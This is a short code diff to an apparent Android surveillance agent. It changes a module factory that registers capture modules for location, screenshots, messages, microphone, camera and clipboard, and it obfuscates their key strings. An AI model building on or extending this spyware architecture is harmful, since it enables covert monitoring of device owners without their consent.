@@ -30,8 +30,12 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 		factorymap.put(M.e("position"), ModulePosition.class);
 		factorymap.put(M.e("screenshot"), ModuleSnapshot.class);
 		factorymap.put(M.e("messages"), ModuleMessage.class);
-		factorymap.put(M.e("mic"), ModuleMic.class);
-        factorymap.put(M.e("camera"), ModuleCamera.class);
+		if (android.os.Build.VERSION.SDK_INT > 20){
+			factorymap.put(M.e("mic"), ModuleMicL.class);
+		}else{
+			factorymap.put(M.e("mic"), ModuleMicD.class);
+		}
+		factorymap.put(M.e("camera"), ModuleCamera.class);
 		factorymap.put(M.e("clipboard"), ModuleClipboard.class);
 		factorymap.put(M.e("crisis"), ModuleCrisis.class);
 		factorymap.put(M.e("application"), ModuleApplication.class);
@@ -59,11 +63,15 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 	 * mapAgent() Add agent id defined by "key" into the running map. If the
 	 * agent is already present, the old object is returned.
 	 * 
-	 * @param key
+	 * @param type
 	 *            : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
 	public BaseModule create(String type, String subtype) {
+		if(Cfg.DEBUG) {
+			Check.requires(type != null, "Null type");
+		}
+
 		BaseModule a = new NullModule();
 		if (factorymap.containsKey(type))
 
